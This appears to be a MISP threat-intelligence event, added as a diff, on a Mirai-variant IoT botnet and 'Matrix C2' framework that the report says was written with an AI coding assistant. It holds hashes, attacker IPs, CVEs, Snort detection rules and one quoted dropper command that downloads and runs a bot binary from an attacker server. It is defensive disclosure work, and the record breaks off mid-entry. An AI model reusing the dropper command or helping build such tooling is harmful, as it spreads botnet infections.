@@ -1,0 +1,1001 @@
+{
+  "Event": {
+    "uuid": "43b09f34-283d-5b09-84eb-a93df291c4c4",
+    "info": "Rovodev AI-Co-Authored Mirai Variant + Matrix C2 (87.106.143.220)",
+    "date": "2026-05-26",
+    "threat_level_id": 1,
+    "analysis": 2,
+    "timestamp": 1791580400,
+    "publish_timestamp": 1791580400,
+    "published": true,
+    "Orgc": {
+      "name": "The Hunters Ledger",
+      "uuid": "8bc8284b-deb5-546c-a233-57ea34b2ea0d"
+    },
+    "Tag": [
+      {
+        "name": "tlp:clear",
+        "colour": "#ffffff"
+      },
+      {
+        "name": "hunters-ledger:topic=\"AI Abuse\"",
+        "colour": "#58a6ff"
+      },
+      {
+        "name": "hunters-ledger:topic=\"C2\"",
+        "colour": "#58a6ff"
+      },
+      {
+        "name": "hunters-ledger:topic=\"Botnet\"",
+        "colour": "#58a6ff"
+      },
+      {
+        "name": "hunters-ledger:topic=\"Open Dir\"",
+        "colour": "#58a6ff"
+      },
+      {
+        "name": "hunters-ledger:actor=\"UTA-2026-014\"",
+        "colour": "#e879f9"
+      },
+      {
+        "name": "misp-galaxy:mitre-attack-pattern=\"Rootkit - T1014\"",
+        "colour": "#0088cc"
+      },
+      {
+        "name": "misp-galaxy:mitre-attack-pattern=\"System Network Configuration Discovery - T1016\"",
+        "colour": "#0088cc"
+      },
+      {
+        "name": "misp-galaxy:mitre-attack-pattern=\"Obfuscated Files or Information - T1027\"",
+        "colour": "#0088cc"
+      },
+      {
+        "name": "misp-galaxy:mitre-attack-pattern=\"Embedded Payloads - T1027.009\"",
+        "colour": "#0088cc"
+      },
+      {
+        "name": "misp-galaxy:mitre-attack-pattern=\"Match Legitimate Name or Location - T1036.004\"",
+        "colour": "#0088cc"
+      },
+      {
+        "name": "misp-galaxy:mitre-attack-pattern=\"RC Scripts - T1037.004\"",
+        "colour": "#0088cc"
+      },
+      {
+        "name": "misp-galaxy:mitre-attack-pattern=\"Exfiltration Over C2 Channel - T1041\"",
+        "colour": "#0088cc"
+      },
+      {
+        "name": "misp-galaxy:mitre-attack-pattern=\"Cron - T1053.003\"",
+        "colour": "#0088cc"
+      },
+      {
+        "name": "misp-galaxy:mitre-attack-pattern=\"Process Discovery - T1057\"",
+        "colour": "#0088cc"
+      },
+      {
+        "name": "misp-galaxy:mitre-attack-pattern=\"Unix Shell - T1059.004\"",
+        "colour": "#0088cc"
+      },
+      {
+        "name": "misp-galaxy:mitre-attack-pattern=\"Python - T1059.006\"",
+        "colour": "#0088cc"
+      },
+      {
+        "name": "misp-galaxy:mitre-attack-pattern=\"JavaScript - T1059.007\"",
+        "colour": "#0088cc"
+      },
+      {
+        "name": "misp-galaxy:mitre-attack-pattern=\"File Deletion - T1070.004\"",
+        "colour": "#0088cc"
+      },
+      {
+        "name": "misp-galaxy:mitre-attack-pattern=\"Web Protocols - T1071.001\"",
+        "colour": "#0088cc"
+      },
+      {
+        "name": "misp-galaxy:mitre-attack-pattern=\"Default Accounts - T1078.001\"",
+        "colour": "#0088cc"
+      },
+      {
+        "name": "misp-galaxy:mitre-attack-pattern=\"System Information Discovery - T1082\"",
+        "colour": "#0088cc"
+      },
+      {
+        "name": "misp-galaxy:mitre-attack-pattern=\"Internal Proxy - T1090.001\"",
+        "colour": "#0088cc"
+      },
+      {
+        "name": "misp-galaxy:mitre-attack-pattern=\"Non-Application Layer Protocol - T1095\"",
+        "colour": "#0088cc"
+      },
+      {
+        "name": "misp-galaxy:mitre-attack-pattern=\"Native API - T1106\"",
+        "colour": "#0088cc"
+      },
+      {
+        "name": "misp-galaxy:mitre-attack-pattern=\"Password Guessing - T1110.001\"",
+        "colour": "#0088cc"
+      },
+      {
+        "name": "misp-galaxy:mitre-attack-pattern=\"Automated Collection - T1119\"",
+        "colour": "#0088cc"
+      },
+      {
+        "name": "misp-galaxy:mitre-attack-pattern=\"Standard Encoding - T1132.001\"",
+        "colour": "#0088cc"
+      },
+      {
+        "name": "misp-galaxy:mitre-attack-pattern=\"External Remote Services - T1133\"",
+        "colour": "#0088cc"
+      },
+      {
+        "name": "misp-galaxy:mitre-attack-pattern=\"Exploit Public-Facing Application - T1190\"",
+        "colour": "#0088cc"
+      },
+      {
+        "name": "misp-galaxy:mitre-attack-pattern=\"Exploitation of Remote Services - T1210\"",
+        "colour": "#0088cc"
+      },
+      {
+        "name": "misp-galaxy:mitre-attack-pattern=\"Data from Information Repositories - T1213\"",
+        "colour": "#0088cc"
+      },
+      {
+        "name": "misp-galaxy:mitre-attack-pattern=\"System Checks - T1497.001\"",
+        "colour": "#0088cc"
+      },
+      {
+        "name": "misp-galaxy:mitre-attack-pattern=\"Direct Network Flood - T1498.001\"",
+        "colour": "#0088cc"
+      },
+      {
+        "name": "misp-galaxy:mitre-attack-pattern=\"Reflection Amplification - T1498.002\"",
+        "colour": "#0088cc"
+      },
+      {
+        "name": "misp-galaxy:mitre-attack-pattern=\"Endpoint Denial of Service - T1499\"",
+        "colour": "#0088cc"
+      },
+      {
+        "name": "misp-galaxy:mitre-attack-pattern=\"Systemd Service - T1543.002\"",
+        "colour": "#0088cc"
+      },
+      {
+        "name": "misp-galaxy:mitre-attack-pattern=\"Unix Shell Configuration Modification - T1546.004\"",
+        "colour": "#0088cc"
+      },
+      {
+        "name": "misp-galaxy:mitre-attack-pattern=\"XDG Autostart Entries - T1547.013\"",
+        "colour": "#0088cc"
+      },
+      {
+        "name": "misp-galaxy:mitre-attack-pattern=\"Credentials in Files - T1552.001\"",
+        "colour": "#0088cc"
+      },
+      {
+        "name": "misp-galaxy:mitre-attack-pattern=\"Hidden Files and Directories - T1564.001\"",
+        "colour": "#0088cc"
+      },
+      {
+        "name": "misp-galaxy:mitre-attack-pattern=\"Symmetric Cryptography - T1573.001\"",
+        "colour": "#0088cc"
+      },
+      {
+        "name": "misp-galaxy:mitre-attack-pattern=\"Acquire Infrastructure: Virtual Private Server - T1583.003\"",
+        "colour": "#0088cc"
+      },
+      {
+        "name": "misp-galaxy:mitre-attack-pattern=\"Compromise Infrastructure: Server - T1584.004\"",
+        "colour": "#0088cc"
+      },
+      {
+        "name": "misp-galaxy:mitre-attack-pattern=\"Develop Capabilities: Malware - T1587.001\"",
+        "colour": "#0088cc"
+      },
+      {
+        "name": "misp-galaxy:mitre-attack-pattern=\"Obtain Capabilities: Malware - T1588.001\"",
+        "colour": "#0088cc"
+      },
+      {
+        "name": "misp-galaxy:mitre-attack-pattern=\"Obtain Capabilities: Exploits - T1588.005\"",
+        "colour": "#0088cc"
+      }
+    ],
+    "Attribute": [
+      {
+        "uuid": "a75e2730-7b5b-523a-88d6-2cbf5734d71c",
+        "type": "link",
+        "category": "External analysis",
+        "value": "https://the-hunters-ledger.com/hunting-detections/rovodev-mirai-matrix-c2-87.106.143.220-detections/",
+        "to_ids": false,
+        "comment": "Detection rules, The Hunters Ledger",
+        "timestamp": 1791580400
+      },
+      {
+        "uuid": "a9b3379c-12d2-58f5-9ee5-1cfc54c2b652",
+        "type": "link",
+        "category": "External analysis",
+        "value": "https://the-hunters-ledger.com/ioc-feeds/rovodev-mirai-matrix-c2-87.106.143.220-iocs.json",
+        "to_ids": false,
+        "comment": "IOC feed (JSON), The Hunters Ledger",
+        "timestamp": 1791580400
+      },
+      {
+        "uuid": "a4076ff7-afad-5ead-b248-581e4bf67e4e",
+        "type": "link",
+        "category": "External analysis",
+        "value": "https://the-hunters-ledger.com/reports/rovodev-mirai-matrix-c2-87.106.143.220/",
+        "to_ids": false,
+        "comment": "Report, The Hunters Ledger",
+        "timestamp": 1791580400
+      },
+      {
+        "uuid": "8d23be71-b400-5f07-b519-51462705aaab",
+        "type": "link",
+        "category": "External analysis",
+        "value": "https://the-hunters-ledger.com/stix/rovodev-mirai-matrix-c2-87.106.143.220.json",
+        "to_ids": false,
+        "comment": "STIX 2.1 bundle, The Hunters Ledger",
+        "timestamp": 1791580400
+      },
+      {
+        "uuid": "3d4f08ba-bc7a-5cac-bbf3-7a5200be3f00",
+        "type": "vulnerability",
+        "category": "External analysis",
+        "value": "CVE-2014-8361",
+        "to_ids": false,
+        "comment": "Named in the report",
+        "timestamp": 1791580400
+      },
+      {
+        "uuid": "bd9bd2b0-ab88-57c5-a608-cb0ff1de9038",
+        "type": "vulnerability",
+        "category": "External analysis",
+        "value": "CVE-2017-17215",
+        "to_ids": false,
+        "comment": "Named in the report",
+        "timestamp": 1791580400
+      },
+      {
+        "uuid": "9e3544f4-07a6-5507-913f-37005f7fead9",
+        "type": "vulnerability",
+        "category": "External analysis",
+        "value": "CVE-2017-6077",
+        "to_ids": false,
+        "comment": "Named in the report",
+        "timestamp": 1791580400
+      },
+      {
+        "uuid": "0de62c3e-591a-5d39-acb9-4fa01e15b25c",
+        "type": "sha256",
+        "category": "Payload delivery",
+        "value": "0c77fee765a40486c396e9b14f6eb9a787c4c5d9261669b60ab35fed7fe1a626",
+        "to_ids": true,
+        "comment": "sha256: 0c77fee765a40486c396e9b14f6eb9a787c4c5d9261669b60ab35fed7fe1a626. Naku.x86, Pandora-Mirai variant. VT 42/66. Microsoft Mirai.AW!MTB. Recommended for binary disassembly (universally tooled x86 disassembly). [confidence 95/100]",
+        "timestamp": 1791580400
+      },
+      {
+        "uuid": "948c9b6c-9daf-5f0d-8b4e-e1e257c64a51",
+        "type": "sha256",
+        "category": "Payload delivery",
+        "value": "4809a7ee9f5dbcbe86cfbd77a45e2a268a37bcc947e8e1621164df653597948b",
+        "to_ids": true,
+        "comment": "sha256: 4809a7ee9f5dbcbe86cfbd77a45e2a268a37bcc947e8e1621164df653597948b. matrix/bot.sh + matrix/payloads/persistent_bot.sh (same SHA), 5-vector Linux persistence installer (cron + rc.local + init.d + systemd + .bashrc/.profile). AI-authored via Rovodev. JSON-over-TCP/1337 wire protocol. [confidence 95/100]",
+        "timestamp": 1791580400
+      },
+      {
+        "uuid": "eb688ce3-1a44-5740-a712-930d54090c48",
+        "type": "sha256",
+        "category": "Payload delivery",
+        "value": "595f4315f00c2fce839eabe9880f669990256d6638fb148996872e37ffc9b28a",
+        "to_ids": true,
+        "comment": "sha256: 595f4315f00c2fce839eabe9880f669990256d6638fb148996872e37ffc9b28a. Naku.arm7, Pandora-Mirai variant DEBUG BUILD (139.5 KB; 710 strings). VT 39/65. Retains canonical Mirai source-tree symbols (attack_method.c / killer.c / telnet.c / table.c / util.c / rand.c / resolv.c + resolve_cnc_addr + auth_table + add_auth_entry) cross-compiled via Rob Landley aboriginal toolchain. [confidence 95/100]",
+        "timestamp": 1791580400
+      },
+      {
+        "uuid": "faca9683-e0c4-5892-a7be-de2de868b6ba",
+        "type": "sha256",
+        "category": "Payload delivery",
+        "value": "64afc3b3a02706ffcf4255bda4519f8c1c66daaaf937a2641fd14a551a34e383",
+        "to_ids": true,
+        "comment": "sha256: 64afc3b3a02706ffcf4255bda4519f8c1c66daaaf937a2641fd14a551a34e383. Naku.arm, Pandora-Mirai 11-arch IoT botnet bot binary. VT 43/66. Microsoft Mirai.AW!xp. Universal MAL_ELF_LNX_Mirai_Oct10_1 YARA. Operator-bespoke XOR-0x54 string obfuscation + 22-char charset 1gba4cdom53nhp12ei0kfj. [confidence 95/100]",
+        "timestamp": 1791580400
+      },
+      {
+        "uuid": "da40399b-73bf-5c23-b4b9-64142eab40c8",
+        "type": "sha256",
+        "category": "Payload delivery",
+        "value": "64ca12cae6f5e520abb4158da3bbc14e909c2128748ae0c5806fa4206cc14260",
+        "to_ids": true,
+        "comment": "sha256: 64ca12cae6f5e520abb4158da3bbc14e909c2128748ae0c5806fa4206cc14260. matrix/bots/mirai_clone.py, Python Mirai-style standalone bot (conceptual Mirai-clone). AI-authored via Rovodev. 5/5 AI-Generated Code Signature match (verbose docstrings + defensive try/except + educational variable names + zero anti-analysis + AI-grade rate limiting). Reports to 87.106.143.220:1337 via pipe-delimited TCP. [confidence 95/100]",
+        "timestamp": 1791580400
+      },
+      {
+        "uuid": "51204046-61b2-59d3-95b6-048ea4cdb3b2",
+        "type": "sha256",
+        "category": "Payload delivery",
+        "value": "81748f0236319c678db39945ec77fffe1b33e84ffa9731b2836b911f8e83a5cc",
+        "to_ids": true,
+        "comment": "sha256: 81748f0236319c678db39945ec77fffe1b33e84ffa9731b2836b911f8e83a5cc. Rovodev session_context.json (257b6faf session, 1.24 MB), DIRECT AI-AUTHORING EVIDENCE; captures file_write tool calls with initial_content payloads creating master_control.py + attack_engine.py + multi_vector_agent.py + encrypted_agent.py + stealth_agent.py. [confidence 95/100]",
+        "timestamp": 1791580400
+      },
+      {
+        "uuid": "aef2d4fc-df05-5d58-8894-740bd66612d5",
+        "type": "sha256",
+        "category": "Payload delivery",
+        "value": "8aca22aa0fc77775521eaa916f490d7a433fd8f0c0f8104bb113f6127be0e530",
+        "to_ids": true,
+        "comment": "sha256: 8aca22aa0fc77775521eaa916f490d7a433fd8f0c0f8104bb113f6127be0e530. Naku.sh4, Pandora-Mirai variant with Gafgyt cross-detection (Microsoft Backdoor:Linux/Gafgyt.P!MTB). VT 43/65. Supports Xbash-hybrid lineage hypothesis. [confidence 95/100]",
+        "timestamp": 1791580400
+      },
+      {
+        "uuid": "e1f9b313-b0ba-5b5c-9ac0-0f0d041abd4b",
+        "type": "sha256",
+        "category": "Payload delivery",
+        "value": "921e4c1d86813838d40010e82a8f374a70b91f06008db5182d1ec6c2da672c09",
+        "to_ids": true,
+        "comment": "sha256: 921e4c1d86813838d40010e82a8f374a70b91f06008db5182d1ec6c2da672c09. attack_engine.py, Matrix C2 multi-protocol DDoS engine. AI-authored via Rovodev. scapy-based UDP/TCP/ICMP floods with source-IP spoofing. Operator self-marketing comment: '# Increased default threads for 50Gbps+'. Method dispatch shows tier-bleed (udp-star/udp-bypass both → udp_flood). [confidence 95/100]",
+        "timestamp": 1791580400
+      },
+      {
+        "uuid": "8a1a86bd-cb90-5201-b232-1ee49d9565d8",
+        "type": "sha256",
+        "category": "Payload delivery",
+        "value": "9e70449b2aafc71c7ff16ece42053fb41b92394cdb88ce799f60d50b4fbefa9e",
+        "to_ids": true,
+        "comment": "sha256: 9e70449b2aafc71c7ff16ece42053fb41b92394cdb88ce799f60d50b4fbefa9e. encrypted_agent.py, Matrix C2 encrypted agent with AES-256-GCM + PBKDF2 + handshake. AI-authored via Rovodev (captured in session_context.json file_write tool call). [confidence 95/100]",
+        "timestamp": 1791580400
+      },
+      {
+        "uuid": "e1e80754-4ee8-5326-a677-1cc7b72dd908",
+        "type": "sha256",
+        "category": "Payload delivery",
+        "value": "9eece9f46bc420b53884d4292622621c9960459c1d7a73635420771e7d0aa1fa",
+        "to_ids": true,
+        "comment": "sha256: 9eece9f46bc420b53884d4292622621c9960459c1d7a73635420771e7d0aa1fa. Rovodev session_context.json (8b911ec6 session, 176 KB), SECOND distinct AI-authoring session. Captures DDoS-as-a-Service tier model JavaScript catalog (VIP/free tiers, GBPS estimates, emoji branding 🔥🚀) + SQL data-load tuple list with schema (method_name, layer_tier, description, power_multiplier, access_tier). [confidence 95/100]",
+        "timestamp": 1791580400
+      },
+      {
+        "uuid": "031c0954-663f-5fef-9826-805f8b6990c5",
+        "type": "sha256",
+        "category": "Payload delivery",
+        "value": "a19b972688158e361e8646ec17556ec46bf84f0cd24fb8707e4df85cb9d9a6d2",
+        "to_ids": true,
+        "comment": "sha256: a19b972688158e361e8646ec17556ec46bf84f0cd24fb8707e4df85cb9d9a6d2. multi_vector_agent.py, Matrix C2 dispatcher. AI-authored via Rovodev. Hunt classifier flags 'Source representation shows indentation/formatting issues likely from copy/paste' (Copy-Paste Indentation Decay sub-pattern #7) + Name/Implementation Mismatch bug (launch_udp_flood calls http_flood.py). [confidence 95/100]",
+        "timestamp": 1791580400
+      },
+      {
+        "uuid": "009f23b7-f6ac-547c-a0e6-bdf74bae3cc7",
+        "type": "sha256",
+        "category": "Payload delivery",
+        "value": "afd49e3ceb20a8e861fa4804b6ea988f8aefd6942f84973f32b8e24c7df03410",
+        "to_ids": true,
+        "comment": "sha256: afd49e3ceb20a8e861fa4804b6ea988f8aefd6942f84973f32b8e24c7df03410. Naku.mips, Pandora-Mirai variant. VT 41/64. Microsoft Mirai.FC!MTB. [confidence 95/100]",
+        "timestamp": 1791580400
+      },
+      {
+        "uuid": "de7b03ce-78e0-5021-a7eb-8ebde594ca6e",
+        "type": "sha256",
+        "category": "Payload delivery",
+        "value": "b7d999255a12da91f23453ec940cdc52b64e59c6e205f227ceae98a83027de20",
+        "to_ids": true,
+        "comment": "sha256: b7d999255a12da91f23453ec940cdc52b64e59c6e205f227ceae98a83027de20. Naku.arm6, Pandora-Mirai variant. VT 42/66. Microsoft Mirai.AW!xp. [confidence 95/100]",
+        "timestamp": 1791580400
+      },
+      {
+        "uuid": "190ce450-c045-5936-8c1a-126b5b5e8b0d",
+        "type": "sha256",
+        "category": "Payload delivery",
+        "value": "d1086ab3c06764ffd81492b4c723bda83bac19dc101c8542bc566e5888c92da3",
+        "to_ids": true,
+        "comment": "sha256: d1086ab3c06764ffd81492b4c723bda83bac19dc101c8542bc566e5888c92da3. stealth_agent.py, Matrix C2 stealth agent with anti-debug + anti-VM + sandbox checks + process hiding + simple rootkit + systemd/cron persistence + self-destruct + polymorphic payload. AI-authored via ESCALATED prompt (refines AI-Generated Code Signature item #4 from structural to prompt-conditional). [confidence 95/100]",
+        "timestamp": 1791580400
+      },
+      {
+        "uuid": "423cd1fb-c36f-597e-a3d1-8cddba2e422f",
+        "type": "sha256",
+        "category": "Payload delivery",
+        "value": "d3fd9994b16dc9b14c29f7faf7b5f6c84f44b06fccf82f0031a0871ce5e20e17",
+        "to_ids": true,
+        "comment": "sha256: d3fd9994b16dc9b14c29f7faf7b5f6c84f44b06fccf82f0031a0871ce5e20e17. pandora.sh, HTTP:80 campaign-channel dropper. VT 17/66. Execution_parent of all 11 Naku binaries per VT. Victim-facing deployment via HTTP (many IoT victims don't support HTTPS). [confidence 95/100]",
+        "timestamp": 1791580400
+      },
+      {
+        "uuid": "f4fac7b2-e71e-52c3-853b-9a9b7859d921",
+        "type": "sha256",
+        "category": "Payload delivery",
+        "value": "d888a16cd6aa76f62a329906db4f241e6bc23ff5f21d61e754ade8ccab6da0d0",
+        "to_ids": true,
+        "comment": "sha256: d888a16cd6aa76f62a329906db4f241e6bc23ff5f21d61e754ade8ccab6da0d0. Rovodev rovodev.log (8.5 MB), Rovodev CLI runtime log including the Discord-bot JavaScript attack-method dispatch table (13+ attack methods catalog). [confidence 95/100]",
+        "timestamp": 1791580400
+      },
+      {
+        "uuid": "a44aadaf-cda9-54ad-999e-0ffc0778cd92",
+        "type": "sha256",
+        "category": "Payload delivery",
+        "value": "e4d3d361ba8b25f8effcf7786b32185cf7255059fcf55b2509101779703a15aa",
+        "to_ids": true,
+        "comment": "sha256: e4d3d361ba8b25f8effcf7786b32185cf7255059fcf55b2509101779703a15aa. Naku.arm5, Pandora-Mirai variant. VT 42/66. Microsoft Mirai.AW!xp. [confidence 95/100]",
+        "timestamp": 1791580400
+      },
+      {
+        "uuid": "afb8ebe2-dde2-55e7-8056-a202a270518b",
+        "type": "sha256",
+        "category": "Payload delivery",
+        "value": "e9e0eafc89e4a9db796c63bb4fdc5c0fd1106f8b9c234fb57e51a7934f2b8d8e",
+        "to_ids": true,
+        "comment": "sha256: e9e0eafc89e4a9db796c63bb4fdc5c0fd1106f8b9c234fb57e51a7934f2b8d8e. master_control.py, Matrix C2 orchestrator. AI-authored via Atlassian Rovodev (captured in session_context.json file_write tool call). Spawns multi_vector_agent.py + socks5_manager.py + backup-VPS deployment workflow. [confidence 95/100]",
+        "timestamp": 1791580400
+      },
+      {
+        "uuid": "af79a940-2caa-5fd3-9395-09cc0e976523",
+        "type": "sha256",
+        "category": "Payload delivery",
+        "value": "ec948aef742c01f91b41df9b19b0ecca3bc8ecf962e2360aee181b9b89abfc78",
+        "to_ids": true,
+        "comment": "sha256: ec948aef742c01f91b41df9b19b0ecca3bc8ecf962e2360aee181b9b89abfc78. Naku.spc, Pandora-Mirai variant. VT 41/66. Microsoft Mirai.FG!MTB. VT-named /tmp/pandora_bot, DEFINITIVE Naku ≡ Pandora identity reconciliation; pandora.sh dropper SHA d3fd9994... as execution_parent. [confidence 95/100]",
+        "timestamp": 1791580400
+      },
+      {
+        "uuid": "83191cbb-4263-52f5-b8e7-34a2b5e2df27",
+        "type": "sha256",
+        "category": "Payload delivery",
+        "value": "ee24f4f0fb9795bca8daba73f99bf1846fe5cdb400f5345ef4a4476b20ab5bc4",
+        "to_ids": true,
+        "comment": "sha256: ee24f4f0fb9795bca8daba73f99bf1846fe5cdb400f5345ef4a4476b20ab5bc4. Naku.m68k, Pandora-Mirai variant. VT 42/66. Microsoft Mirai.BO!xp. [confidence 95/100]",
+        "timestamp": 1791580400
+      },
+      {
+        "uuid": "eccd90d2-cbfd-5d27-89cf-b4fe1e7de1aa",
+        "type": "sha256",
+        "category": "Payload delivery",
+        "value": "ef693f29b4ae47b1aa5920237946c3b0518ce84dd37e6fd6c6ee2e3e9dd6cd44",
+        "to_ids": true,
+        "comment": "sha256: ef693f29b4ae47b1aa5920237946c3b0518ce84dd37e6fd6c6ee2e3e9dd6cd44. Naku.mpsl, Pandora-Mirai variant. VT 42/66. Microsoft Mirai.DY!MTB. [confidence 95/100]",
+        "timestamp": 1791580400
+      },
+      {
+        "uuid": "79bad53f-2820-5e94-83e7-d7333570396d",
+        "type": "sha256",
+        "category": "Payload delivery",
+        "value": "f90658253261f8dc63446dac49a88baa0742f46a2f5448fb330acb58017980ef",
+        "to_ids": true,
+        "comment": "sha256: f90658253261f8dc63446dac49a88baa0742f46a2f5448fb330acb58017980ef. Naku.ppc, Pandora-Mirai variant. VT 42/65. Microsoft Mirai.BL!xp. [confidence 95/100]",
+        "timestamp": 1791580400
+      },
+      {
+        "uuid": "1986f266-626a-5121-bf1b-38c956451d84",
+        "type": "sha256",
+        "category": "Payload delivery",
+        "value": "fba4072941038d27a28a1089ab24d9c3e22f0db19994f3c12c688085903a6ded",
+        "to_ids": true,
+        "comment": "sha256: fba4072941038d27a28a1089ab24d9c3e22f0db19994f3c12c688085903a6ded. matrix/bots/web_scraper_bot.py, Python BFS depth-3 credential/secret harvester. AI-authored via Rovodev. 5/5 AI-Generated Code Signature match. Extracts AWS keys / GitHub PATs / Slack tokens / Stripe sk_live keys from victim HTML. [confidence 95/100]",
+        "timestamp": 1791580400
+      },
+      {
+        "uuid": "49b53344-3c88-5397-8c2c-af51129dcb73",
+        "type": "url",
+        "category": "Network activity",
+        "value": "http://80.211.94.16/Naku.mips",
+        "to_ids": true,
+        "comment": "url: http://80.211.94.16/Naku.mips. Distribution URL embedded plaintext in Naku.arm exploit payload (CVE-2014-8361 Realtek + CVE-2017-17215 Huawei droppers). Full payload: 'cd /var; rm -rf nig; wget http://80.211.94.16/Naku.mips -O nig; chmod 777 nig; ./nig realtek'. [confidence 95/100]",
+        "timestamp": 1791580400
+      },
+      {
+        "uuid": "0a8c8248-0bce-59ba-91bf-00eccb02d0e5",
+        "type": "url",
+        "category": "Network activity",
+        "value": "http://87.106.143.220/bot.sh",
+        "to_ids": true,
+        "comment": "url: http://87.106.143.220/bot.sh. Persistence-reseed URL embedded in all 5 persistence vectors of persistent_bot.sh. Operator pushes updated bot binaries by replacing bot.sh on the IONOS VPS; all infected hosts re-download on next cron/login/restart. [confidence 95/100]",
+        "timestamp": 1791580400
+      },
+      {
+        "uuid": "f850d938-7827-5d41-8291-5f91b3ddf064",
+        "type": "ip-dst",
+        "category": "Network activity",
+        "value": "165.227.175.161",
+        "to_ids": true,
+        "comment": "ipv4: 165.227.175.161. Parasitic Naku CNC on COMPROMISED GetYourGroup tourism VPS (DigitalOcean US allocation 165.227.0.0/16). TCP/23 daemon planted on legitimate Ubuntu 18.04 + OpenSSH 7.6p1 + MariaDB 10.2.44 + RunCloud-managed production VPS hosting auvergne-rhone-alpes-for-groups.com tourism domain. CNC IP hardcoded inline in Naku.arm main() as 0xa1afe3a5. False_positive_risk: HIGH (legitimate tourism VPS, coordinate with GetYourGroup BEFORE any takedown). [confidence 95/100]",
+        "timestamp": 1791580400
+      },
+      {
+        "uuid": "362f1692-d6de-59aa-a441-9b9b3feffccf",
+        "type": "ip-dst",
+        "category": "Network activity",
+        "value": "188.166.194.243",
+        "to_ids": true,
+        "comment": "ipv4: 188.166.194.243. DEFENDER CONTEXT, NOT operator-controlled. Shares all 3 SSH host keys with 165.227.175.161 due to RunCloud snapshot-deploy pattern. Hosts 28 GetYourGroup tourism domains including getyourgroup.de, france-for-groups.com, occitanie-for-groups.com, paris-region-for-groups.com. NO port 23 listener. Include as defender-context to prevent false-positive blocking of clean GetYourGroup sibling VPS. false_positive_risk: DEFINITE. [confidence 60/100]",
+        "timestamp": 1791580400
+      },
+      {
+        "uuid": "0055ae51-792d-5129-9cc9-2b05a8c3286a",
+        "type": "ip-dst",
+        "category": "Network activity",
+        "value": "80.211.111.10",
+        "to_ids": true,
+        "comment": "ipv4: 80.211.111.10. Aruba S.p.A. Italy sibling distribution server (ASN AS31034). Embedded in all 11 Naku binaries alongside .94.16. VT 0/55 (clean reputation = burning-fuse). Currently DARK on all 40 ports tested as of 2026-05-24. [confidence 80/100]",
+        "timestamp": 1791580400
+      },
+      {
+        "uuid": "32c3efa3-cde8-52c8-b0ae-ab3afb9538fd",
+        "type": "ip-dst",
+        "category": "Network activity",
+        "value": "80.211.94.16",
+        "to_ids": true,
+        "comment": "ipv4: 80.211.94.16. Aruba S.p.A. Italy distribution server (ASN AS31034). Embedded plaintext in all 11 Naku binaries as 'http://80.211.94.16/Naku.mips'. VT 5/56 detections. Currently OFFLINE as of 2026-05-24 (ACL asymmetry suggests targeted filtering policy). Burning-fuse OPSEC pattern. [confidence 95/100]",
+        "timestamp": 1791580400
+      },
+      {
+        "uuid": "57b8060b-a4f8-56bd-afb1-deee5bec09bc",
+        "type": "ip-dst",
+        "category": "Network activity",
+        "value": "87.106.143.220",
+        "to_ids": true,
+        "comment": "ipv4: 87.106.143.220. Operator-OWNED primary IONOS DE VPS. Hosts Matrix C2 framework C2 on TCP/1337 + bot.sh distribution on HTTP/80 + Naku binary HTTPS-channel test on /bins/Naku.*/443 + Pandora HTTP-channel deploy on /Pandoras_Box/Pandora.*/80 + .rovodev/ AI authoring session directory + 22+ AI-generated handoff documents. [confidence 95/100]",
+        "timestamp": 1791580400
+      },
+      {
+        "uuid": "b27813ad-42be-53c3-929b-63a78ba773ab",
+        "type": "ip-dst",
+        "category": "Network activity",
+        "value": "87.106.54.213",
+        "to_ids": true,
+        "comment": "ipv4: 87.106.54.213. Operator-OWNED backup IONOS DE VPS (same /16 as primary). Referenced in IMPLEMENTATION_PLAN.txt Phase 2 for dual scanning + 1000+/day infection rate target. [confidence 95/100]",
+        "timestamp": 1791580400
+      },
+      {
+        "uuid": "80272067-e82c-52fa-b3e0-fc6746cf3c3e",
+        "type": "snort",
+        "category": "Network activity",
+        "value": "alert http $HOME_NET any -> $EXTERNAL_NET any (msg:\"THL DETECT UTA-2026-014 Pandora-Mirai Naku Binary Distribution URI Path (IoT Botnet Payload Delivery)\"; flow:established,to_server; http.uri; content:\"/bins/Naku.\"; startswith; reference:url,the-hunters-ledger.com/hunting-detections/rovodev-mirai-matrix-c2-87.106.143.220-detections/; classtype:trojan-activity; sid:9300503; rev:3; metadata:author The_Hunters_Ledger, date 2026-05-26;)",
+        "to_ids": true,
+        "comment": "Pandora-Mirai Naku Binary Distribution URI Path | TIER: Detection | robustness 2 | confidence HIGH | ATT&CK T1071.001, T1587.001 | rule hash 992a8707 | https://the-hunters-ledger.com/hunting-detections/rovodev-mirai-matrix-c2-87.106.143.220-detections/",
+        "timestamp": 1791580400,
+        "Tag": [
+          {
+            "name": "hunters-ledger:tier=\"Detection\"",
+            "colour": "#4ade80"
+          }
+        ]
+      },
+      {
+        "uuid": "12cc4717-0387-50a8-ac39-721da66606b2",
+        "type": "snort",
+        "category": "Network activity",
+        "value": "alert http $HOME_NET any -> $EXTERNAL_NET any (msg:\"THL DETECT UTA-2026-014 Pandora-Mirai Pandoras-Box Binary Distribution URI Path (IoT Botnet Payload Delivery)\"; flow:established,to_server; http.uri; content:\"/Pandoras_Box/Pandora.\"; startswith; reference:url,the-hunters-ledger.com/hunting-detections/rovodev-mirai-matrix-c2-87.106.143.220-detections/; classtype:trojan-activity; sid:9300505; rev:3; metadata:author The_Hunters_Ledger, date 2026-05-26;)",
+        "to_ids": true,
+        "comment": "Pandora-Mirai Pandoras-Box Binary Distribution URI Path | TIER: Detection | robustness 2 | confidence HIGH | ATT&CK T1071.001, T1587.001 | rule hash 70432092 | https://the-hunters-ledger.com/hunting-detections/rovodev-mirai-matrix-c2-87.106.143.220-detections/",
+        "timestamp": 1791580400,
+        "Tag": [
+          {
+            "name": "hunters-ledger:tier=\"Detection\"",
+            "colour": "#4ade80"
+          }
+        ]
+      },
+      {
+        "uuid": "57b25e23-2966-5461-b063-94ec94906615",
+        "type": "snort",
+        "category": "Network activity",
+        "value": "alert http $HOME_NET any -> $EXTERNAL_NET any (msg:\"THL HUNT UTA-2026-014 Naku Binary Fetch URI Pattern - Historical Aruba Backup Distribution Convention (Bare Substring Anchor)\"; flow:established,to_server; http.uri; content:\"Naku.\"; nocase; reference:url,the-hunters-ledger.com/hunting-detections/rovodev-mirai-matrix-c2-87.106.143.220-detections/; classtype:trojan-activity; sid:9001009; rev:3; metadata:author The_Hunters_Ledger, date 2026-05-26;)",
+        "to_ids": false,
